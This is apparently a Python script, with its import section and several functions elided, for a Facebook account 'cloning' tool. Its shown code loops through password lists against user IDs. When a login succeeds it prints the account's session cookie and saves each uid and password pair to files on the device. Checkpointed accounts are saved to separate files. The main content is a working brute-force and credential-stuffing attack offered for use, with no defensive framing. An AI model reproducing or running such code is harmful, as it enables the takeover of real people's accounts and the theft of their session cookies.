#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#Sc Make By Arzen Ramos Crescent
#Gift By Niño & Arzen
#Github Arzen-Tools
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
...
logo =("""
 ╔═════════════════════╗╔════════════════════════════╗   
 ║  ▄▄ • ▪  ·▄▄▄▄▄▄▄▄  ║║ Developar : ARZEN RAMOS CRESCENT ║
 ║ ▐█ ▀ ▪██ ▐▄▄·•██    ║║ Admin     : Niño & Arzen  ║
 ║ ▄█ ▀█▄▐█·██▪  ▐█.▪  <> Github    : Arzen-Tools        ║
 ║ ▐█▄▪▐█▐█▌██▌. ▐█▌·  ║║ Stetus    : Free Sc Gift   ║
 ║ ·▀▀▀▀ ▀▀▀▀▀▀  ▀▀▀   ║║ Code      : 02             ║
...
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mARZEN RAMOS CRESCENT \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-01\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
\033[1;97m ╔══════════════════════════════════════╗   
 ...
 \033[1;97m╚══════════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mARZEN RAMOS CRESCENT    \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
def Contact():
	...
	if Tymin in ['4']:
		os.system('xdg-open https://facebook.com/groups/1636288700174325/')
	if Tymin in ['5']:
		os.system('xdg-open https://www.facebook.com/61555410915326')
	if Tymin in ['6']:
		os.system('xdg-open wa.me/+639168364596')
	if Tymin in ['7']:
		os.system('xdg-open t.me/bma.fuck')
	if Tymin in ['8']:
		os.system('xdg-open https://github.com/Arzen-Tools')
	if Tymin in ['9']:
		Nodi_Hasan()
	if Tymin in ['0']:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mARZEN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/ARZEN-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[ARZEN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ARZEN-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mARZEN-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/ARZEN-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ARZEN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ARZEN-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mARZEN-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/ARZEN-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ARZEN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ARZEN-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mARZEN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/ARZEN-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ARZEN-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ARZEN-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mARZEN-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/ARZEN-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ARZEN-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/ARZEN-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
